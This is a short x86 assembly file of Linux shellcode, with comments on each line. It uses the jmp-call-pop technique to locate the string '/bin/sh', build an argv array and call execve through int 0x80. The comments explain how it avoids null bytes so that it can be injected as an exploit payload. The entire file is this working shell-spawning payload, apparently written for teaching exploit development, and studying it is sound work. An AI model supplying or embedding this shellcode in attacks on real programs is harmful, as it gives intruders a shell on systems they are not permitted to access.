BITS 32

jmp short one		;jump to bottom

exec:
 ;execve(argv[0], argv, NULL)
 pop	ebx		;pop addr for string from stack to ebx
 xor 	eax,eax		;clear eax
 mov	[ebx+7], al	;null terminate string at address ebx+7(x) by copying from al
 mov	[ebx+8], ebx	;put adddress for argv into string(AAAA) by copying value ebx
 mov    [ebx+12], eax   ;put 32 bit null terminator from eax into end of string(BBBB)

 lea	ecx, [ebx+8]	;load address of argv(AAAA) into ecx
 lea	edx, [ebx+12]	;load address of null(BBBB) into edx
 mov	al, 11		;fill xor-ed eax with syscall 11 (execve)

 int	0x80		;use interupt 80 to perform syscall

one:
 call exec		;call back to one, no nulls and pops string addr
 db '/bin/shXAAAABBBB'	;string /bin/sh+x(null char)+AAAA(argv addr)+BBBB(null string)
